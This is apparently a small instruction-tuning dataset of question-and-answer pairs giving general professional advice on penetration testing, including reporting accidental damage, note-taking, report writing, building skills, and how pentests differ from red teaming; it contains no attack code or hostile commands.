{"instruction": "What if I accidentally cause damage?", "input": "", "output": "Stop immediately. Document what happened. Notify your point of contact. This is why we have scope agreements and insurance. Transparency is crucial."}
{"instruction": "How do I stay organized during a long engagement?", "input": "", "output": "Use a note-taking system (CherryTree, Obsidian). Take screenshots constantly. Log all commands. Create a timeline of activities. Review and organize daily."}
{"instruction": "When should I use automated vs manual testing?", "input": "", "output": "Use automated tools for coverage (scanning, fuzzing) but always verify findings manually. Manual testing is essential for logic flaws and complex vulnerabilities."}
{"instruction": "How do I explain technical findings to executives?", "input": "", "output": "Focus on business impact, not technical details. Use risk language they understand: data breach, financial loss, reputation damage. Provide clear remediation priorities."}
{"instruction": "What makes a good pentest report?", "input": "", "output": "Clear executive summary, reproducible findings, risk-based prioritization, actionable remediation steps, and supporting evidence. The reader should understand the risk and what to do about it."}
{"instruction": "How do I improve my pentesting skills?", "input": "", "output": "Practice on labs (HackTheBox, TryHackMe). Read writeups. Learn from others. Build a home lab. Get certifications. Participate in CTFs. Never stop learning."}
{"instruction": "What's the difference between pentest and red team?", "input": "", "output": "Pentests focus on finding vulnerabilities in defined scope. Red teams simulate real adversaries, testing detection and response, often with broader scope and stealth requirements."}
